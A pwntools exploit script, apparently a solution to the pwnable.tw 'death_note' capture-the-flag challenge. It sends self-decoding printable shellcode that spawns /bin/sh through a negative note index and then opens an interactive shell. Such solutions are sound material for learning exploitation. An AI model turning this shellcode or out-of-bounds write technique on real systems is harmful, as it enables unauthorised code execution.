from pwn import *
import sys

host = 'chall.pwnable.tw'
port = 10201

if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./death_note')

def add(idx,value):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', value)
instructions = """
push 0x68
push 0x732f2f2f
push 0x6e69622f

push esp
pop ebx

push edx
dec edx
dec edx
dec edx

xor byte ptr [eax+0x22], dl
xor byte ptr [eax+0x23], dl

pop edx

push 0x2b
pop eax
xor al, 0x20

push 0x20
push 0x20
"""

payload = asm(instructions) +'\x30\x7d'
print(payload)


add(-19, payload)


r.interactive()


